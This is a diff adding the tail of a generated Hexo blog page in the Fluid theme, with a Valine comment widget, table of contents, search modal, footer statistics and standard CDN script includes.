+                      <a href="/Environment/Blog-building/" title="Blog-building">
+                        <span class="hidden-mobile">Blog-building</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"4pk0DV0Gzc6TMpnuyhQwgcgs-gzGzoHsz","appKey":"4MnQ5z5ovVgFNdAOxLy5UlVV","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Virtuall</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
